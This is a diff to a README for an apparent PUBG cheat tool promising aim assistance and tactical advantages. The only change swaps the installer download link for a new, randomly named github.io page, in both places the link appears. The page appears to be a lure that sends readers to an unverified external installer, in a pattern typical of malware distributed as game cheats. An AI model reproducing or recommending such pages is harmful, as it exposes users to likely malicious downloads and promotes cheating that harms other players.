@@ -2,7 +2,7 @@
 
 PUBG PC Enhancement Suite 2026 is a powerful desktop application designed to enhance your PUBG gaming experience on Windows 10 and 11. This suite offers a comprehensive set of tools for gameplay customization, performance optimization, and advanced features to elevate your sessions in 2026. Whether you're looking to improve precision, gain tactical advantages, or personalize your interface, this tool provides a user-friendly solution.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Introduction
 The PUBG PC Enhancement Suite 2026 is crafted for gamers who want to push the boundaries of their PUBG gameplay on Windows desktops. Developed with the latest 2026 updates in mind, it integrates advanced algorithms and customizable options to suit both casual and competitive players. This tool focuses on enhancing visual clarity, aim assistance, and system performance without compromising stability.
@@ -69,4 +69,4 @@ This tool is intended for educational and personal use only. The developers are 
 For any issues, questions, or feedback, please open an issue on the GitHub repository. Our team monitors inquiries regularly in 2026 and aims to provide timely assistance.
 
 ## Download
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
